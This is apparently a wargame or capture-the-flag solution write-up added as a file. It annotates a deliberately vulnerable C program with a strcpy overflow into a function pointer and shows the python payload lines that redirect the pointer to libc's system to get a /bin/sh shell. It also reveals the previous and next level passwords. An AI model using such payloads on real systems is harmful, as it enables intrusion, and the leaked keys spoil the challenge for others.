@@ -1,0 +1,121 @@
+Previous key: neezocaeng
+
+/*
+    This program is free software; you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation; either version 2 of the License, or
+    (at your option) any later version.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with this program; if not, write to the Free Software
+    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+extern char **environ;
+
+int main(int argc, char *argv[]){
+	char b1[8], b2[8];
+	int  (*fp)(char *)=(int(*)(char *))&puts, i;
+
+	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }
+
+	/* clear environ */
+	for(i=0; environ[i] != NULL; i++)
+		memset(environ[i], '\0', strlen(environ[i]));
+	/* clear argz    */
+	for(i=3; argv[i] != NULL; i++)
+		memset(argv[i], '\0', strlen(argv[i]));
+
+	strcpy(b1,argv[1]);
+	strcpy(b2,argv[2]);
+	if(((unsigned long)fp & 0xff000000) == 0xff000000)
+		exit(-1);
+	fp(b1);
+
+	exit(1);
+}
+
+This isn't the easiest thing to read.
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+extern char **environ;
+
+int main(int argc, char *argv[]){
+	char buffer1[8];
+	char buffer2[8];
+
+	int  (*fp)(char *)=(int(*)(char *))&puts; //?????
+	int i;
+
+	if (argc!=3) {
+		printf("%s b1 b2\n", argv[0]);
+		exit(-1);
+	}
+
+	/* clear environment variables */
+	for(i=0; environ[i] != NULL; i++)
+		memset(environ[i], '\0', strlen(environ[i]));
+
+	/* clear arguments after 3 */
+	for(i=3; argv[i] != NULL; i++)
+		memset(argv[i], '\0', strlen(argv[i]));
+
+	//The vuln is probably here.
+	strcpy(buffer1,argv[1]);
+	strcpy(buffer2,argv[2]);
+
+	//If fp got set to something on the stack (address starts with 0xff), quit now.
+	if (((unsigned long)fp & 0xff000000) == 0xff000000)
+		exit(-1);
+
+	//Run puts
+	fp(b1);
+
+	//No return :(
+	exit(1);
+}
+
+I am going to want to execute some shellcode, so what I might want to do here is overwrite the return address and change fp to the end of main.
+
+Let's try it!
+
+The function pointer for fp is stored in esp+0x38, and when I run with AAAAAAAA AAAAAAAA (8 As each), the \x00 that gets appended to the end overwrites a byte in the fp address, resulting in a segfault.
+
+Turns out I can't overwrite fp with the end of main (or any return address) because a new stack frame gets made and there's no return at the end of main.
+
+Maybe a return to libc?
+
+system is in the same place every time. That's useful.
+
+I'm going to try to return to system and pass it /bin/sh
+
+I had to mess with it a bit to get the values to align first, so this is what got me to overwriting the fp address:
+
+`python -c "print 'AAAAAAA ' + '/bin/shAAAAAAAAA' + '\x50\xa2\xe6\xf7'"`
+
+`python -c "print 'AAAAAAA ' + '/bin/shA/bin//sh' + '\x50\xa2\xe6\xf7'"`
+
+That gets me /bin//shP??? not found, because there's no null byte at the end of it so it tries to execute an invalid string.
+
+`python -c "print 'AAAAAAAAAAAAAAAAAAA ' + 'AAAAAAAA/bin//sh' + '\x50\xa2\xe6\xf7'"`
+
+Oh, shoot. I see what's happening. This is like one of the microcorruption challenges. I need to overflow with the first buffer to overwrite the return address and keep the second buffer at a normal length so I keep the null byte.
+
+`python -c "print 'AAAAAAAA' + '\x50\xa2\xe6\xf7' + ' ' + 'AAAAAAAA/bin/sh'"`
+
+Running it with that worked. Time to use it on the actual program.
+
+Woo!
+
+ahkiaziphu
